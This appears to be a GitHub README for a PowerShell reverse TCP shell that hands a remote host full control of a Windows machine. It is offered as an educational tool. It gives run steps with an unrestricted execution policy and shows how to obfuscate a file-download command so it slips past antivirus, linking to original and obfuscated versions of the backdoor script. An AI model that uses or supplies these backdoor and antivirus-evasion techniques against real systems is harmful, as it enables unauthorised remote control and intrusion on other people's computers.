# PowerShell Reverse TCP

PowerShell script for connecting to a remote host.

Remote host will have full control over client's PowerShell and all its underlying commands.

Tested with PowerShell v5.1.18362.145 on Windows 10 Enterprise OS (64 bit).

Made for educational purposes. I hope it will help!

## How to Run

**Change the IP address and port number inside the script.**

To start the PowerShell, run the following command from your Command Prompt:

```batch
START PowerShell -ExecutionPolicy Unrestricted -NoProfile
```

To execute the script, run the following command from your PowerShell:

```pwsh
& .\powershell_reverse_tcp.ps1
```

## PowerShell Obfuscation

Try to bypass an antivirus or some other security mechanisms by obfuscating your scripts.

You can see such obfuscation in the following example.

Original PowerShell command:

```pwsh
(New-Object Net.WebClient).DownloadFile($url, $out)
```

Obfuscated PowerShell command:

```pwsh
(& (`G`C`M *w-O*) Net.WebClient)."`D`O`W`N`L`O`A`D`F`I`L`E"($url, $out)
```

**Check the original PowerShell script [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/powershell_reverse_tcp.ps1) and the obfuscated one [here](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/src/powershell_reverse_tcp_obfuscated.ps1).**

Besides manual obfuscation, the original PowerShell script was also obfuscated with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) tool. Credits to the author!

Search the Internet for additional methods and obfuscation techniques.

## Images

![Backdoor](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/img/backdoor.jpg)

![Shell](https://github.com/ivan-sincek/powershell-reverse-tcp/blob/master/img/shell.jpg)
